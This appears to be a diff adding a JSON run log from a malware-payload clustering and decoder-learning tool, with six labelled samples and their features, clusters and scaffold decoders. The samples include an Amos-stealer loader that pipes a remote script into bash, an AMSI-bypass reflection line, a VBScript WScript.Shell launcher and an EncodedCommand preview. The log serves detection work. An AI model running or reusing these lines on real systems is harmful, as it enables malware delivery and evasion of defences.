@@ -1,0 +1,802 @@
+{
+  "run_timestamp": "2026-07-18T09:40:00Z",
+  "samples_submitted": 6,
+  "submission_results": [
+    {
+      "label": "1. macOS Amos Stealer \u2014 AppleScript wrapper",
+      "submit_response": {
+        "id": "134990eb-5453-420c-aa5a-13378b80bf1d",
+        "cluster_key": "printable|small|b64|-|-",
+        "dupes": [
+          {
+            "id": "87b8d8aa-4170-43a6-a9db-e26be17a451e",
+            "similarity": 65,
+            "status": "rolled_back",
+            "preview": "cmd /V:ON /c \"set X=power^she^ll&&!X! -EncodedCommand VwByAG"
+          }
+        ]
+      },
+      "raw_payload": "osascript -e 'do shell script \"curl -sSfL https://amoshub.io/latest.sh | bash\"'"
+    },
+    {
+      "label": "2. Cobalt Strike Malleable C2 \u2014 hex+bxor",
+      "submit_response": {
+        "id": "d5b03468-a544-42f9-9314-b3b1f91abdb4",
+        "cluster_key": "printable|small|b64|-|-",
+        "dupes": [
+          {
+            "id": "87b8d8aa-4170-43a6-a9db-e26be17a451e",
+            "similarity": 75,
+            "status": "rolled_back",
+            "preview": "cmd /V:ON /c \"set X=power^she^ll&&!X! -EncodedCommand VwByAG"
+          },
+          {
+            "id": "134990eb-5453-420c-aa5a-13378b80bf1d",
+            "similarity": 75,
+            "status": "inbox",
+            "preview": "osascript -e 'do shell script \"curl -sSfL https://amoshub.io"
+          }
+        ]
+      },
+      "raw_payload": "=[Convert]::FromBase64String('aGVsbG8='); for(=0;-lt.Length;++){[]=[]-bxor 0x2A}; [Text.Encoding]::ASCII.GetString()"
+    },
+    {
+      "label": "3. GCP Service Account JWT",
+      "submit_response": {
+        "id": "c180f111-68da-4a45-ad00-685a33d76448",
+        "cluster_key": "base64|medium|b64|-|-",
+        "dupes": []
+      },
+      "raw_payload": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImFiYzEyMyJ9.eyJpc3MiOiJzdmMtYWNjb3VudEBteS1wcm9qZWN0LmlhbS5nc2VydmljZWFjY291bnQuY29tIiwic2NvcGUiOiJodHRwczovL3d3dy5nb29nbGVhcGlzLmNvbS9hdXRoL2Nsb3VkLXBsYXR"
+    },
+    {
+      "label": "4. AWS Cognito ID Token abuse",
+      "submit_response": {
+        "id": "755ed7ce-22b2-472d-be86-61746336c42b",
+        "cluster_key": "base64|medium|b64|-|-",
+        "dupes": [
+          {
+            "id": "c180f111-68da-4a45-ad00-685a33d76448",
+            "similarity": 88,
+            "status": "inbox",
+            "preview": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImFiYzEyMyJ9.eyJ"
+          }
+        ]
+      },
+      "raw_payload": "eyJraWQiOiJmZDU3OTAyOSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiJhYmMtMTIzIiwiY29nbml0bzp1c2VybmFtZSI6InZpY3RpbUB0YXJnZXQuY29tIiwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkcC51cy1lYXN0LTEuYW1hem9uYXdzLmNvbS91cy1lYXN0LTFf"
+    },
+    {
+      "label": "5. VBScript character-code payload",
+      "submit_response": {
+        "id": "fc0d2cb0-be70-45ee-b33d-faf0697263d3",
+        "cluster_key": "printable|small|b64|-|lol",
+        "dupes": []
+      },
+      "raw_payload": "Dim s:s=Chr(101)&Chr(120)&Chr(101)&Chr(99):CreateObject(\"WScript.Shell\").Run s&\" /c calc\",0,False"
+    },
+    {
+      "label": "6. PowerShell reflection AmsiScanBuffer patch (short form)",
+      "submit_response": {
+        "id": "6870cd02-1629-4b50-a7e0-d338f767d6ad",
+        "cluster_key": "printable|small|b64|-|-",
+        "dupes": [
+          {
+            "id": "87b8d8aa-4170-43a6-a9db-e26be17a451e",
+            "similarity": 85,
+            "status": "rolled_back",
+            "preview": "cmd /V:ON /c \"set X=power^she^ll&&!X! -EncodedCommand VwByAG"
+          },
+          {
+            "id": "134990eb-5453-420c-aa5a-13378b80bf1d",
+            "similarity": 85,
+            "status": "inbox",
+            "preview": "osascript -e 'do shell script \"curl -sSfL https://amoshub.io"
+          },
+          {
+            "id": "d5b03468-a544-42f9-9314-b3b1f91abdb4",
+            "similarity": 75,
+            "status": "inbox",
+            "preview": "=[Convert]::FromBase64String('aGVsbG8='); for(=0;-lt.Length;"
+          }
+        ]
+      },
+      "raw_payload": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(,)"
+    }
+  ],
+  "clusters_snapshot": {
+    "clusters": [
+      {
+        "cluster_key": "printable|small|b64|-|-",
+        "count": 4,
+        "stats": {
+          "rolled_back": 1,
+          "inbox": 3
+        },
+        "last": "2026-07-18T09:44:09.159289+00:00"
+      },
+      {
+        "cluster_key": "base64|medium|b64|-|-",
+        "count": 2,
+        "stats": {
+          "inbox": 2
+        },
+        "last": "2026-07-18T09:44:08.975093+00:00"
+      },
+      {
+        "cluster_key": "printable|small|-|esc|-",
+        "count": 1,
+        "stats": {
+          "rolled_back": 1
+        },
+        "last": "2026-07-17T12:03:00.241472+00:00"
+      },
+      {
+        "cluster_key": "base64|small|b64|-|lol",
+        "count": 1,
+        "stats": {
+          "proposed": 1
+        },
+        "last": "2026-07-17T11:58:14.077193+00:00"
+      },
+      {
+        "cluster_key": "printable|small|b64|-|lol",
+        "count": 1,
+        "stats": {
+          "inbox": 1
+        },
+        "last": "2026-07-18T09:44:09.065003+00:00"
+      }
+    ]
+  },
+  "inbox_snapshot": {
+    "count": 6,
+    "rows": [
+      {
+        "id": "6870cd02-1629-4b50-a7e0-d338f767d6ad",
+        "created_at": "2026-07-18T09:44:09.159289+00:00",
+        "created_by": "admin@nivxray.com",
+        "notes": "Short-form AMSI reflection bypass",
+        "tags": [
+          "powershell",
+          "amsi-bypass",
+          "reflection"
+        ],
+        "features": {
+          "length": 122,
+          "entropy": 4.713,
+          "charset": "printable",
+          "b64_ratio": 0.803,
+          "hex_ratio": 0.254,
+          "printable_ratio": 1.0,
+          "has_percent_esc": false,
+          "has_backslash_x": false,
+          "has_unicode_esc": false,
+          "has_html_entity": false,
+          "has_lolbas": false,
+          "lolbas_tokens": [],
+          "top_bigrams": [
+            ".A",
+            "em",
+            "et",
+            "ti",
+            "bl"
+          ],
+          "length_band": "small"
+        },
+        "cluster_key": "printable|small|b64|-|-",
+        "status": "inbox",
+        "preview": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue("
+      },
+      {
+        "id": "fc0d2cb0-be70-45ee-b33d-faf0697263d3",
+        "created_at": "2026-07-18T09:44:09.065003+00:00",
+        "created_by": "admin@nivxray.com",
+        "notes": "VBS char-code assembly to bypass string signatures",
+        "tags": [
+          "vbscript",
+          "char-code",
+          "obfuscation"
+        ],
+        "features": {
+          "length": 97,
+          "entropy": 4.886,
+          "charset": "printable",
+          "b64_ratio": 0.711,
+          "hex_ratio": 0.34,
+          "printable_ratio": 1.0,
+          "has_percent_esc": false,
+          "has_backslash_x": false,
+          "has_unicode_esc": false,
+          "has_html_entity": false,
+          "has_lolbas": true,
+          "lolbas_tokens": [
+            "wscript"
+          ],
+          "top_bigrams": [
+            "Ch",
+            "hr",
+            "r(",
+            "(1",
+            ")&"
+          ],
+          "length_band": "small"
+        },
+        "cluster_key": "printable|small|b64|-|lol",
+        "status": "inbox",
+        "preview": "Dim s:s=Chr(101)&Chr(120)&Chr(101)&Chr(99):CreateObject(\"WScript.Shell\").Run s&\" /c calc\",0,False"
+      },
+      {
+        "id": "755ed7ce-22b2-472d-be86-61746336c42b",
+        "created_at": "2026-07-18T09:44:08.975093+00:00",
+        "created_by": "admin@nivxray.com",
+        "notes": "Post-phish Cognito token exchange",
+        "tags": [
+          "cloud",
+          "aws",
+          "cognito",
+          "credential-abuse"
+        ],
+        "features": {
+          "length": 260,
+          "entropy": 5.552,
+          "charset": "base64",
+          "b64_ratio": 0.992,
+          "hex_ratio": 0.296,
+          "printable_ratio": 1.0,
+          "has_percent_esc": false,
+          "has_backslash_x": false,
+          "has_unicode_esc": false,
+          "has_html_entity": false,
+          "has_lolbas": false,
+          "lolbas_tokens": [],
+          "top_bigrams": [
+            "Ii",
+            "YX",
+            "XN",
+            "iO",
+            "SI"
+          ],
+          "length_band": "medium"
+        },
+        "cluster_key": "base64|medium|b64|-|-",
+        "status": "inbox",
+        "preview": "eyJraWQiOiJmZDU3OTAyOSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiJhYmMtMTIzIiwiY29nbml0bzp1c2VybmFtZSI6InZpY3RpbUB0YXJnZXQuY29tIiwi"
+      },
+      {
+        "id": "c180f111-68da-4a45-ad00-685a33d76448",
+        "created_at": "2026-07-18T09:44:08.881015+00:00",
+        "created_by": "admin@nivxray.com",
+        "notes": "GCP service-account credential misuse",
+        "tags": [
+          "cloud",
+          "gcp",
+          "jwt",
+          "credential-abuse"
+        ],
+        "features": {
+          "length": 304,
+          "entropy": 5.616,
+          "charset": "base64",
+          "b64_ratio": 0.99,
+          "hex_ratio": 0.326,
+          "printable_ratio": 1.0,
+          "has_percent_esc": false,
+          "has_backslash_x": false,
+          "has_unicode_esc": false,
+          "has_html_entity": false,
+          "has_lolbas": false,
+          "lolbas_tokens": [],
+          "top_bigrams": [
+            "iO",
+            "29",
+            "YX",
+            "yJ",
+            "Oi"
+          ],
+          "length_band": "medium"
+        },
+        "cluster_key": "base64|medium|b64|-|-",
+        "status": "inbox",
+        "preview": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImFiYzEyMyJ9.eyJpc3MiOiJzdmMtYWNjb3VudEBteS1wcm9qZWN0LmlhbS5nc2VydmljZWFjY29"
+      },
+      {
+        "id": "d5b03468-a544-42f9-9314-b3b1f91abdb4",
+        "created_at": "2026-07-18T09:44:08.783658+00:00",
+        "created_by": "admin@nivxray.com",
+        "notes": "CS beacon config bxor pattern",
+        "tags": [
+          "powershell",
+          "bxor",
+          "cobalt-strike"
+        ],
+        "features": {
+          "length": 116,
+          "entropy": 5.307,
+          "charset": "printable",
+          "b64_ratio": 0.707,
+          "hex_ratio": 0.216,
+          "printable_ratio": 1.0,
+          "has_percent_esc": false,
+          "has_backslash_x": false,
+          "has_unicode_esc": false,
+          "has_html_entity": false,
+          "has_lolbas": false,
+          "lolbas_tokens": [],
+          "top_bigrams": [
+            "ng",
+            "in",
+            "=[",
+            "]:",
+            "::"
+          ],
+          "length_band": "small"
+        },
+        "cluster_key": "printable|small|b64|-|-",
+        "status": "inbox",
+        "preview": "=[Convert]::FromBase64String('aGVsbG8='); for(=0;-lt.Length;++){[]=[]-bxor 0x2A}; [Text.Encoding]::ASCII.GetString()"
+      },
+      {
+        "id": "134990eb-5453-420c-aa5a-13378b80bf1d",
+        "created_at": "2026-07-18T09:44:08.632025+00:00",
+        "created_by": "admin@nivxray.com",
+        "notes": "Amos macOS stealer canonical loader",
+        "tags": [
+          "macos",
+          "amos",
+          "osascript",
+          "stealer"
+        ],
+        "features": {
+          "length": 79,
+          "entropy": 4.362,
+          "charset": "printable",
+          "b64_ratio": 0.759,
+          "hex_ratio": 0.177,
+          "printable_ratio": 1.0,
+          "has_percent_esc": false,
+          "has_backslash_x": false,
+          "has_unicode_esc": false,
+          "has_html_entity": false,
+          "has_lolbas": false,
+          "lolbas_tokens": [],
+          "top_bigrams": [
+            "sh",
+            "os",
+            "as",
+            "sc",
+            "cr"
+          ],
+          "length_band": "small"
+        },
+        "cluster_key": "printable|small|b64|-|-",
+        "status": "inbox",
+        "preview": "osascript -e 'do shell script \"curl -sSfL https://amoshub.io/latest.sh | bash\"'"
+      }
+    ]
+  },
+  "analyze_responses": [
+    {
+      "payload_id": "134990eb-5453-420c-aa5a-13378b80bf1d",
+      "analyze_response": {
+        "id": "134990eb-5453-420c-aa5a-13378b80bf1d",
+        "proposal": {
+          "archetype_id": "LEARNED_PRINTABLE_SMALL_B64_N_N",
+          "features": {
+            "length": 79,
+            "entropy": 4.362,
+            "charset": "printable",
+            "b64_ratio": 0.759,
+            "hex_ratio": 0.177,
+            "printable_ratio": 1.0,
+            "has_percent_esc": false,
+            "has_backslash_x": false,
+            "has_unicode_esc": false,
+            "has_html_entity": false,
+            "has_lolbas": false,
+            "lolbas_tokens": [],
+            "top_bigrams": [
+              "sh",
+              "os",
+              "as",
+              "sc",
+              "cr"
+            ],
+            "length_band": "small"
+          },
+          "cluster_key": "printable|small|b64|-|-",
+          "wrapper_regex": null,
+          "decode_chain": [
+            "base64-decode"
+          ],
+          "confidence": 55,
+          "confidence_breakdown": {
+            "regex": 5,
+            "entropy": 20,
+            "charsets": 15,
+            "decode_path": 5,
+            "corpus_match": 10,
+            "total": 55
+          },
+          "why": "charset ~75% base64 alphabet; proposed decode chain: base64-decode",
+          "why_not": {
+            "missing": [
+              "no explicit byte-escape markers",
+              "no stable wrapper regex could be lifted"
+            ],
+            "recommendation": "Need 2-3 more sibling samples to strengthen the pattern."
+          },
+          "code": "# \u2500\u2500\u2500 LEARNED \u00b7 LEARNED_PRINTABLE_SMALL_B64_N_N \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nimport re as _re\n_RGX_LEARNED_PRINTABLE_SMALL_B64_N_N = _re.compile('^\\\\s*$', _re.IGNORECASE)\n\ndef _match_LEARNED_PRINTABLE_SMALL_B64_N_N(t: str) -> bool:\n    return bool(_RGX_LEARNED_PRINTABLE_SMALL_B64_N_N.search(t or \"\"))\n\ndef _handle_LEARNED_PRINTABLE_SMALL_B64_N_N(t: str) -> str:\n    # NOTE: candidate scaffold \u2014 analyst should refine the decode\n    # pipeline. Chain proposed: ['base64-decode']\n    return t  # placeholder \u2014 replace with real decode logic\n\n_ARCHETYPE_LEARNED_PRINTABLE_SMALL_B64_N_N = {\n    \"id\": \"LEARNED_PRINTABLE_SMALL_B64_N_N\",\n    \"description\": \"learner-generated archetype (chain: \" + \" \u2192 \".join(['base64-decode']) + \")\",\n    \"chain\":   ['base64-decode'],\n    \"handler\": _handle_LEARNED_PRINTABLE_SMALL_B64_N_N,\n    \"match\":   _match_LEARNED_PRINTABLE_SMALL_B64_N_N,\n    \"terminal\": False,\n}\nLEARNED_ARCHETYPES.append(_ARCHETYPE_LEARNED_PRINTABLE_SMALL_B64_N_N)"
+        }
+      }
+    },
+    {
+      "payload_id": "d5b03468-a544-42f9-9314-b3b1f91abdb4",
+      "analyze_response": {
+        "id": "d5b03468-a544-42f9-9314-b3b1f91abdb4",
+        "proposal": {
+          "archetype_id": "LEARNED_PRINTABLE_SMALL_B64_N_N",
+          "features": {
+            "length": 116,
+            "entropy": 5.307,
+            "charset": "printable",
+            "b64_ratio": 0.707,
+            "hex_ratio": 0.216,
+            "printable_ratio": 1.0,
+            "has_percent_esc": false,
+            "has_backslash_x": false,
+            "has_unicode_esc": false,
+            "has_html_entity": false,
+            "has_lolbas": false,
+            "lolbas_tokens": [],
+            "top_bigrams": [
+              "ng",
+              "in",
+              "=[",
+              "]:",
+              "::"
+            ],
+            "length_band": "small"
+          },
+          "cluster_key": "printable|small|b64|-|-",
+          "wrapper_regex": "FromBase64String\\(\\s*['\\\"](?P<b64>[A-Za-z0-9+/=]+)['\\\"]\\s*\\)",
+          "decode_chain": [
+            "base64-decode"
+          ],
+          "confidence": 85,
+          "confidence_breakdown": {
+            "regex": 35,
+            "entropy": 20,
+            "charsets": 15,
+            "decode_path": 5,
+            "corpus_match": 10,
+            "total": 85
+          },
+          "why": "wrapper regex candidate: `FromBase64String\\(\\s*['\\\"](?P<b64>[A-Za-z0-9+/=]+)['\\\"]\\s*\\)`; charset ~70% base64 alphabet; proposed decode chain: base64-decode",
+          "why_not": {
+            "missing": [
+              "no explicit byte-escape markers"
+            ],
+            "recommendation": "Need 2-3 more sibling samples to strengthen the pattern."
+          },
+          "code": "# \u2500\u2500\u2500 LEARNED \u00b7 LEARNED_PRINTABLE_SMALL_B64_N_N \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nimport re as _re\n_RGX_LEARNED_PRINTABLE_SMALL_B64_N_N = _re.compile('FromBase64String\\\\(\\\\s*[\\'\\\\\"](?P<b64>[A-Za-z0-9+/=]+)[\\'\\\\\"]\\\\s*\\\\)', _re.IGNORECASE)\n\ndef _match_LEARNED_PRINTABLE_SMALL_B64_N_N(t: str) -> bool:\n    return bool(_RGX_LEARNED_PRINTABLE_SMALL_B64_N_N.search(t or \"\"))\n\ndef _handle_LEARNED_PRINTABLE_SMALL_B64_N_N(t: str) -> str:\n    # NOTE: candidate scaffold \u2014 analyst should refine the decode\n    # pipeline. Chain proposed: ['base64-decode']\n    return t  # placeholder \u2014 replace with real decode logic\n\n_ARCHETYPE_LEARNED_PRINTABLE_SMALL_B64_N_N = {\n    \"id\": \"LEARNED_PRINTABLE_SMALL_B64_N_N\",\n    \"description\": \"learner-generated archetype (chain: \" + \" \u2192 \".join(['base64-decode']) + \")\",\n    \"chain\":   ['base64-decode'],\n    \"handler\": _handle_LEARNED_PRINTABLE_SMALL_B64_N_N,\n    \"match\":   _match_LEARNED_PRINTABLE_SMALL_B64_N_N,\n    \"terminal\": False,\n}\nLEARNED_ARCHETYPES.append(_ARCHETYPE_LEARNED_PRINTABLE_SMALL_B64_N_N)"
+        }
+      }
+    },
+    {
+      "payload_id": "c180f111-68da-4a45-ad00-685a33d76448",
+      "analyze_response": {
+        "id": "c180f111-68da-4a45-ad00-685a33d76448",
+        "proposal": {
+          "archetype_id": "LEARNED_BASE64_MEDIUM_B64_N_N",
+          "features": {
+            "length": 304,
+            "entropy": 5.616,
+            "charset": "base64",
+            "b64_ratio": 0.99,
+            "hex_ratio": 0.326,
+            "printable_ratio": 1.0,
+            "has_percent_esc": false,
+            "has_backslash_x": false,
+            "has_unicode_esc": false,
+            "has_html_entity": false,
+            "has_lolbas": false,
+            "lolbas_tokens": [],
+            "top_bigrams": [
+              "iO",
+              "29",
+              "YX",
+              "yJ",
+              "Oi"
+            ],
+            "length_band": "medium"
+          },
+          "cluster_key": "base64|medium|b64|-|-",
+          "wrapper_regex": null,
+          "decode_chain": [
+            "base64-decode"
+          ],
+          "confidence": 55,
+          "confidence_breakdown": {
+            "regex": 5,
+            "entropy": 20,
+            "charsets": 15,
+            "decode_path": 5,
+            "corpus_match": 10,
+            "total": 55
+          },
+          "why": "charset ~99% base64 alphabet; proposed decode chain: base64-decode",
+          "why_not": {
+            "missing": [
+              "no explicit byte-escape markers",
+              "no stable wrapper regex could be lifted"
+            ],
+            "recommendation": "Need 2-3 more sibling samples to strengthen the pattern."
+          },
+          "code": "# \u2500\u2500\u2500 LEARNED \u00b7 LEARNED_BASE64_MEDIUM_B64_N_N \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nimport re as _re\n_RGX_LEARNED_BASE64_MEDIUM_B64_N_N = _re.compile('^\\\\s*$', _re.IGNORECASE)\n\ndef _match_LEARNED_BASE64_MEDIUM_B64_N_N(t: str) -> bool:\n    return bool(_RGX_LEARNED_BASE64_MEDIUM_B64_N_N.search(t or \"\"))\n\ndef _handle_LEARNED_BASE64_MEDIUM_B64_N_N(t: str) -> str:\n    # NOTE: candidate scaffold \u2014 analyst should refine the decode\n    # pipeline. Chain proposed: ['base64-decode']\n    return t  # placeholder \u2014 replace with real decode logic\n\n_ARCHETYPE_LEARNED_BASE64_MEDIUM_B64_N_N = {\n    \"id\": \"LEARNED_BASE64_MEDIUM_B64_N_N\",\n    \"description\": \"learner-generated archetype (chain: \" + \" \u2192 \".join(['base64-decode']) + \")\",\n    \"chain\":   ['base64-decode'],\n    \"handler\": _handle_LEARNED_BASE64_MEDIUM_B64_N_N,\n    \"match\":   _match_LEARNED_BASE64_MEDIUM_B64_N_N,\n    \"terminal\": False,\n}\nLEARNED_ARCHETYPES.append(_ARCHETYPE_LEARNED_BASE64_MEDIUM_B64_N_N)"
+        }
+      }
+    },
+    {
+      "payload_id": "755ed7ce-22b2-472d-be86-61746336c42b",
+      "analyze_response": {
+        "id": "755ed7ce-22b2-472d-be86-61746336c42b",
+        "proposal": {
+          "archetype_id": "LEARNED_BASE64_MEDIUM_B64_N_N",
+          "features": {
+            "length": 260,
+            "entropy": 5.552,
+            "charset": "base64",
+            "b64_ratio": 0.992,
+            "hex_ratio": 0.296,
+            "printable_ratio": 1.0,
+            "has_percent_esc": false,
+            "has_backslash_x": false,
+            "has_unicode_esc": false,
+            "has_html_entity": false,
+            "has_lolbas": false,
+            "lolbas_tokens": [],
+            "top_bigrams": [
+              "Ii",
+              "YX",
+              "XN",
+              "iO",
+              "SI"
+            ],
+            "length_band": "medium"
+          },
+          "cluster_key": "base64|medium|b64|-|-",
+          "wrapper_regex": null,
+          "decode_chain": [
+            "base64-decode"
+          ],
+          "confidence": 55,
+          "confidence_breakdown": {
+            "regex": 5,
+            "entropy": 20,
+            "charsets": 15,
+            "decode_path": 5,
+            "corpus_match": 10,
+            "total": 55
+          },
+          "why": "charset ~99% base64 alphabet; proposed decode chain: base64-decode",
+          "why_not": {
+            "missing": [
+              "no explicit byte-escape markers",
+              "no stable wrapper regex could be lifted"
+            ],
+            "recommendation": "Need 2-3 more sibling samples to strengthen the pattern."
+          },
+          "code": "# \u2500\u2500\u2500 LEARNED \u00b7 LEARNED_BASE64_MEDIUM_B64_N_N \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nimport re as _re\n_RGX_LEARNED_BASE64_MEDIUM_B64_N_N = _re.compile('^\\\\s*$', _re.IGNORECASE)\n\ndef _match_LEARNED_BASE64_MEDIUM_B64_N_N(t: str) -> bool:\n    return bool(_RGX_LEARNED_BASE64_MEDIUM_B64_N_N.search(t or \"\"))\n\ndef _handle_LEARNED_BASE64_MEDIUM_B64_N_N(t: str) -> str:\n    # NOTE: candidate scaffold \u2014 analyst should refine the decode\n    # pipeline. Chain proposed: ['base64-decode']\n    return t  # placeholder \u2014 replace with real decode logic\n\n_ARCHETYPE_LEARNED_BASE64_MEDIUM_B64_N_N = {\n    \"id\": \"LEARNED_BASE64_MEDIUM_B64_N_N\",\n    \"description\": \"learner-generated archetype (chain: \" + \" \u2192 \".join(['base64-decode']) + \")\",\n    \"chain\":   ['base64-decode'],\n    \"handler\": _handle_LEARNED_BASE64_MEDIUM_B64_N_N,\n    \"match\":   _match_LEARNED_BASE64_MEDIUM_B64_N_N,\n    \"terminal\": False,\n}\nLEARNED_ARCHETYPES.append(_ARCHETYPE_LEARNED_BASE64_MEDIUM_B64_N_N)"
+        }
+      }
+    },
+    {
+      "payload_id": "fc0d2cb0-be70-45ee-b33d-faf0697263d3",
+      "analyze_response": {
+        "id": "fc0d2cb0-be70-45ee-b33d-faf0697263d3",
+        "proposal": {
+          "archetype_id": "LEARNED_PRINTABLE_SMALL_B64_N_LOL",
+          "features": {
+            "length": 97,
+            "entropy": 4.886,
+            "charset": "printable",
+            "b64_ratio": 0.711,
+            "hex_ratio": 0.34,
+            "printable_ratio": 1.0,
+            "has_percent_esc": false,
+            "has_backslash_x": false,
+            "has_unicode_esc": false,
+            "has_html_entity": false,
+            "has_lolbas": true,
+            "lolbas_tokens": [
+              "wscript"
+            ],
+            "top_bigrams": [
+              "Ch",
+              "hr",
+              "r(",
+              "(1",
+              ")&"
+            ],
+            "length_band": "small"
+          },
+          "cluster_key": "printable|small|b64|-|lol",
+          "wrapper_regex": "WScript",
+          "decode_chain": [
+            "base64-decode",
+            "lolbas-annotate"
+          ],
+          "confidence": 90,
+          "confidence_breakdown": {
+            "regex": 35,
+            "entropy": 20,
+            "charsets": 15,
+            "decode_path": 10,
+            "corpus_match": 10,
+            "total": 90
+          },
+          "why": "wrapper regex candidate: `WScript`; charset ~71% base64 alphabet; LOLBAS token(s): wscript; proposed decode chain: base64-decode \u2192 lolbas-annotate",
+          "why_not": {
+            "missing": [
+              "no explicit byte-escape markers"
+            ],
+            "recommendation": "Need 2-3 more sibling samples to strengthen the pattern."
+          },
+          "code": "# \u2500\u2500\u2500 LEARNED \u00b7 LEARNED_PRINTABLE_SMALL_B64_N_LOL \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nimport re as _re\n_RGX_LEARNED_PRINTABLE_SMALL_B64_N_LOL = _re.compile('WScript', _re.IGNORECASE)\n\ndef _match_LEARNED_PRINTABLE_SMALL_B64_N_LOL(t: str) -> bool:\n    return bool(_RGX_LEARNED_PRINTABLE_SMALL_B64_N_LOL.search(t or \"\"))\n\ndef _handle_LEARNED_PRINTABLE_SMALL_B64_N_LOL(t: str) -> str:\n    # NOTE: candidate scaffold \u2014 analyst should refine the decode\n    # pipeline. Chain proposed: ['base64-decode', 'lolbas-annotate']\n    return t  # placeholder \u2014 replace with real decode logic\n\n_ARCHETYPE_LEARNED_PRINTABLE_SMALL_B64_N_LOL = {\n    \"id\": \"LEARNED_PRINTABLE_SMALL_B64_N_LOL\",\n    \"description\": \"learner-generated archetype (chain: \" + \" \u2192 \".join(['base64-decode', 'lolbas-annotate']) + \")\",\n    \"chain\":   ['base64-decode', 'lolbas-annotate'],\n    \"handler\": _handle_LEARNED_PRINTABLE_SMALL_B64_N_LOL,\n    \"match\":   _match_LEARNED_PRINTABLE_SMALL_B64_N_LOL,\n    \"terminal\": False,\n}\nLEARNED_ARCHETYPES.append(_ARCHETYPE_LEARNED_PRINTABLE_SMALL_B64_N_LOL)"
+        }
+      }
+    },
+    {
+      "payload_id": "6870cd02-1629-4b50-a7e0-d338f767d6ad",
+      "analyze_response": {
+        "id": "6870cd02-1629-4b50-a7e0-d338f767d6ad",
+        "proposal": {
+          "archetype_id": "LEARNED_PRINTABLE_SMALL_B64_N_N",
+          "features": {
+            "length": 122,
+            "entropy": 4.713,
+            "charset": "printable",
+            "b64_ratio": 0.803,
+            "hex_ratio": 0.254,
+            "printable_ratio": 1.0,
+            "has_percent_esc": false,
+            "has_backslash_x": false,
+            "has_unicode_esc": false,
+            "has_html_entity": false,
+            "has_lolbas": false,
+            "lolbas_tokens": [],
+            "top_bigrams": [
+              ".A",
+              "em",
+              "et",
+              "ti",
+              "bl"
+            ],
+            "length_band": "small"
+          },
+          "cluster_key": "printable|small|b64|-|-",
+          "wrapper_regex": null,
+          "decode_chain": [
+            "base64-decode"
+          ],
+          "confidence": 55,
+          "confidence_breakdown": {
+            "regex": 5,
+            "entropy": 20,
+            "charsets": 15,
+            "decode_path": 5,
+            "corpus_match": 10,
+            "total": 55
+          },
+          "why": "charset ~80% base64 alphabet; proposed decode chain: base64-decode",
+          "why_not": {
+            "missing": [
+              "no explicit byte-escape markers",
+              "no stable wrapper regex could be lifted"
+            ],
+            "recommendation": "Need 2-3 more sibling samples to strengthen the pattern."
+          },
+          "code": "# \u2500\u2500\u2500 LEARNED \u00b7 LEARNED_PRINTABLE_SMALL_B64_N_N \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nimport re as _re\n_RGX_LEARNED_PRINTABLE_SMALL_B64_N_N = _re.compile('^\\\\s*$', _re.IGNORECASE)\n\ndef _match_LEARNED_PRINTABLE_SMALL_B64_N_N(t: str) -> bool:\n    return bool(_RGX_LEARNED_PRINTABLE_SMALL_B64_N_N.search(t or \"\"))\n\ndef _handle_LEARNED_PRINTABLE_SMALL_B64_N_N(t: str) -> str:\n    # NOTE: candidate scaffold \u2014 analyst should refine the decode\n    # pipeline. Chain proposed: ['base64-decode']\n    return t  # placeholder \u2014 replace with real decode logic\n\n_ARCHETYPE_LEARNED_PRINTABLE_SMALL_B64_N_N = {\n    \"id\": \"LEARNED_PRINTABLE_SMALL_B64_N_N\",\n    \"description\": \"learner-generated archetype (chain: \" + \" \u2192 \".join(['base64-decode']) + \")\",\n    \"chain\":   ['base64-decode'],\n    \"handler\": _handle_LEARNED_PRINTABLE_SMALL_B64_N_N,\n    \"match\":   _match_LEARNED_PRINTABLE_SMALL_B64_N_N,\n    \"terminal\": False,\n}\nLEARNED_ARCHETYPES.append(_ARCHETYPE_LEARNED_PRINTABLE_SMALL_B64_N_N)"
+        }
+      }
+    }
+  ],
+  "proposals_list": {
+    "rows": [
+      {
+        "id": "6870cd02-1629-4b50-a7e0-d338f767d6ad",
+        "created_at": "2026-07-18T09:44:09.159289+00:00",
+        "notes": "Short-form AMSI reflection bypass",
+        "cluster_key": "printable|small|b64|-|-",
+        "proposal": {
+          "archetype_id": "LEARNED_PRINTABLE_SMALL_B64_N_N",
+          "decode_chain": [
+            "base64-decode"
+          ],
+          "confidence": 55
+        }
+      },
+      {
+        "id": "fc0d2cb0-be70-45ee-b33d-faf0697263d3",
